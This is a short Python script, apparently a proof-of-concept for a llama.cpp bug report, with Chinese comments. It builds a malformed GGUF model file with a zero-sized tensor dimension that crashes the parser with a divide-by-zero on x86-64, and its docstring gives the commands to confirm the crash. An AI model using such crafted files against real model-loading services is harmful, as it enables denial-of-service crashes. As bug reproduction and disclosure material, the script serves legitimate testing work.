#!/usr/bin/env python3
"""gen_zero_dim_gguf.py —— llama.cpp#26366 的最小 PoC 生成器

构造一个合法 GGUF 文件，其唯一张量带零维度（ne=[1,0]）。
gguf-py 认为该文件合法（shape [1,0]、n_bytes 0），但 llama.cpp 的
ggml/src/gguf.cpp 在溢出预检中对 ne[j] 做除法（只校验 >=0 未校验 !=0），
x86-64 上 IDIV 除零触发 #DE → SIGFPE（rc=136）；arm64 上 SDIV 除零得 0，
文件被静默拒绝——行为随架构分叉。

用法：
    python3 gen_zero_dim_gguf.py /tmp/zero_dim.gguf

验证（在 llama.cpp 构建后）：
    bin/llama-gguf /tmp/zero_dim.gguf r     # x86-64 预期 SIGFPE (rc=136)
    python3 -c "import gguf; r=gguf.GGUFReader('/tmp/zero_dim.gguf'); \
        print([(t.name, t.shape) for t in r.tensors])"   # gguf-py 正常接受

注意：本脚本只生成测试文件，不修改任何上游代码。
"""
import struct
import sys

MAGIC = b"GGUF"
VERSION = 3
GGML_TYPE_F32 = 0


def gguf_string(s: str) -> bytes:
    b = s.encode("utf-8")
    return struct.pack("<Q", len(b)) + b


def main() -> None:
    out = sys.argv[1] if len(sys.argv) > 1 else "/tmp/zero_dim.gguf"
    buf = bytearray()
    # header: magic, version, tensor_count, metadata_kv_count
    buf += MAGIC
    buf += struct.pack("<I", VERSION)
    buf += struct.pack("<Q", 1)  # 1 tensor
    buf += struct.pack("<Q", 0)  # 0 metadata kv
    # tensor info: name, n_dims, dims, type, offset
    buf += gguf_string("t")
    buf += struct.pack("<I", 2)          # n_dims = 2
    buf += struct.pack("<Q", 1)          # ne[0] = 1
    buf += struct.pack("<Q", 0)          # ne[1] = 0  <- 触发点
    buf += struct.pack("<I", GGML_TYPE_F32)
    buf += struct.pack("<Q", 0)          # offset
    # 数据区起点按默认对齐 32 取整；文件必须延伸到该偏移，
    # 否则示例读取器在 "seek to data section" 处先行失败，
    # 到不了触发除法的代码路径（这正是原报告文件为 96 字节的原因）。
    data_offset = ((len(buf) + 31) // 32) * 32
    buf += b"\x00" * (data_offset - len(buf))
    with open(out, "wb") as f:
        f.write(buf)
    print(f"written {out} ({len(buf)} bytes, data offset {data_offset})")


if __name__ == "__main__":
    main()
